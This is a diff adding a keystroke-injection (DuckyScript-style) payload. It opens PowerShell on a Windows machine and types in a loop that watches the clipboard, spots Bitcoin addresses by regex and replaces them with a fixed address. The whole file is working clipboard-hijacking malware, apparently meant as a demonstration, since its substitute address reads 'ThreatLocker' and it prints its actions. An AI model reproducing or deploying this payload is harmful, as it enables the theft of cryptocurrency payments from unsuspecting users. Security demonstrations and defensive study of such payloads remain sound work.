@@ -1,0 +1,13 @@
+REM AUTHOR KIERAN HUMAN
+
+DELAY 2000
+GUI r
+DELAY 1000
+STRING powershell
+ENTER
+DELAY 2000
+STRING Add-Type -AssemblyName System.Windows.Forms; $dummyAddress="bc1qThreatLocker9x8w7v6t5r4e3d2c1b0a7z6y5x4w3v"; function Is-BitcoinAddress{param($text) return $text -match '^(1|3|bc1)[a-zA-HJ-NP-Z0-9]{25,75}$'}
+ENTER
+DELAY 2000
+STRING while ($true) { $clipboardText = [Windows.Forms.Clipboard]::GetText(); if ($clipboardText -and (Is-BitcoinAddress $clipboardText) -and ($clipboardText -ne $dummyAddress)) { Write-Host "Bitcoin address detected: $clipboardText"; [Windows.Forms.Clipboard]::SetText($dummyAddress); Write-Host "Clipboard replaced with dummy address: $dummyAddress" }; Start-Sleep -Seconds 1 }
+ENTER
